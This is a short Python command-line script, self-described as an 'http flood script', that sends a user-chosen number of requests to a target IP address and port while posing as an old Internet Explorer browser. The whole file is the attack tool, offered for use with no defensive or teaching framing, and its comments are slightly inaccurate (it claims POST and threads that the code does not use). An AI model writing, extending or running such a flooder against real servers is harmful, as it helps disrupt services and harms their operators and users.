from argparse import ArgumentParser, Namespace
import random
import string
import sys
from urllib.request import Request, urlopen


def get_random_string(length: int) -> str:
    """
    Function previously used to generate random GET parameters.
    Now it's here for using in future.
    """
    letters: str = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def attack(url: str) -> None:
    """
    Send an HTTP POST request to the specified url
    :param url: http://.../
    """
    try:
        headers: dict = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
        req: Request = Request(url, headers=headers)
        urlopen(req)
    except Exception as e:
        print(e.__repr__())


def main(options: Namespace) -> None:
    port: int = options.port
    url: str = f'http://{options.ip}:{port}/'
    requests_count: int = options.requests_count
    if port < 1 or port > 65535:
        print('Specified invalid target port', file=sys.stderr)
        sys.exit(1)
    if requests_count <= 0:
        print('Specified invalid count of threads', file=sys.stderr)
        sys.exit(1)
    for i in range(requests_count):
        attack(url)


def parse_arguments() -> Namespace:
    parser = ArgumentParser(description='http flood script')
    parser.add_argument('-a', '--address',
                        action='store',
                        dest='ip',
                        required=True,
                        help='destination IPv4 address')

    parser.add_argument('-p', '--port',
                        action='store',
                        dest='port',
                        required=True,
                        type=int,
                        help='destination port')

    parser.add_argument('-c', '--requests-count',
                        action='store',
                        dest='requests_count',
                        required=True,
                        type=int,
                        help='number of requests')
    return parser.parse_args()


if __name__ == '__main__':
    main(parse_arguments())
